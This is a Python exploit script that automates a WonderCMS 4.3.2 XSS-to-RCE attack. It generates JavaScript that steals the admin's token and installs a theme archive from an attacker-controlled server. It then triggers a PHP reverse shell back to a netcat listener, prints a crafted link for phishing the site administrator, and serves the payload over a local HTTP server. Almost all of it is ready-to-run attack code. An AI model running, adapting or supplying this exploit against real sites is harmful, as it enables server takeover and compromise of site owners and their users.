# Author: prodigiousMind
# Exploit: Wondercms 4.3.2 XSS to RCE

import argparse
import os
from urllib.parse import urlparse


# Set up argument parser
parser = argparse.ArgumentParser(
    description="WonderCMS 4.3.2 XSS to RCE Exploit",
    add_help=True
)

parser.add_argument("-u", "--url", required=True, help="The login URL of the WonderCMS site (e.g., http://localhost/wondercms/loginURL)")
parser.add_argument("-lh", "--lhost", required=True, help="The IP address for the reverse shell listener")
parser.add_argument("-lp", "--lport", required=True, help="The port for the reverse shell listener")
parser.add_argument("-sh", "--srvhost", required=True, help="The local IP serving the malicious XSS JavaScript")
parser.add_argument("-sp", "--srvport", required=True, help="The local port serving the malicious XSS JavaScript")

# Parse arguments
args = parser.parse_args()

print("##################################")
print("# Wondercms 4.3.2 XSS to RCE     #")
print("# Original POC by prodigiousMind #")
print("# Updated version by Ducksec     #")
print("##################################")

# Debugging...
print("\n")
print("Check you got this stuff right!")
print("\n")
print(f"Parsed arguments:\nURL: {args.url}\nLHOST: {args.lhost}\nLPORT: {args.lport}\nSRVHOST: {args.srvhost}\nSRVPORT: {args.srvport}")
print("\n")

# Construct the JavaScript payload with user-supplied arguments
# Double curly braces to escape
data = f'''
var url = "{args.url}";

// Create a URL object to properly manipulate the URL
var parsedUrl = new URL(url);

// Remove the last part of the path
var urlWithoutLogBase = parsedUrl.origin + parsedUrl.pathname.split("/").slice(0, -1).join("/");

// Get the token value from the DOM
var token = document.querySelector('[name="token"]').value;

// Construct the URL for the module installation
var urlRev = urlWithoutLogBase + "/?installModule=http://{args.srvhost}:{args.srvport}/main.zip&directoryName=violet&type=themes&token=" + token;

var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();

xhr3.onload = function() {{
  if (xhr3.status == 200) {{
    // After the module is installed, trigger the reverse shell
    var xhr4 = new XMLHttpRequest();
    xhr4.withCredentials = true;
    xhr4.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php");
    xhr4.send();

    xhr4.onload = function() {{
      if (xhr4.status == 200) {{
        // If the reverse shell is accessible, trigger it with IP and port
        var ip = "{args.lhost}";
        var port = "{args.lport}";
        var xhr5 = new XMLHttpRequest();
        xhr5.withCredentials = true;
        xhr5.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
        xhr5.send();
      }}
    }};
  }}
}};
'''

# Write the XSS payload to a file
try:
    #print(data) Handy for debugging
    with open("xss.js", "w") as file:
        file.write(data)
        print("[+] xss.js is created")
        print(f"[+] Execute the below command in another terminal:\n\n----------------------------\nnc -lvp {args.lport}")
        print("----------------------------\n")
        
    # Construct the XSS link to be sent to the admin
    XSSlink = args.url.replace("loginURL", "index.php?page=loginURL?") + f'"></form><script+src="http://{args.lhost}:{args.srvport}/xss.js"></script><form+action="'
    XSSlink = XSSlink.strip(" ")
    print(f"Send the below link to admin:\n\n----------------------------\n{XSSlink}")
    print("----------------------------\n")

    print("\n")
    print("[+] Ensure that main.zip is still in this directory.")
    print("[+] Once the target successfully requests main.zip it's safe to kill this script.")
    print("\n")

 

    # get the TLD
    parsed_url = urlparse(args.url)
    hostname = parsed_url.hostname
    domain_parts = hostname.split('.')
    tld = '.'.join(domain_parts[-2:])

    print(f"[+] Once complete, you can also re-exploit by requesting: http://{tld}/themes/revshell-main/rev.php?lhost={args.lhost}&lport={args.lport}")
    

    # Start a local HTTP server to serve the XSS payload
    print("\nStarting HTTP server to allow access to xss.js")
    srvcmd= f"python3 -m http.server {args.srvport}"
    os.system(srvcmd)

except Exception as e:
    print(data, "\n", "//write this to a file")
    print(f"Error: {e}")
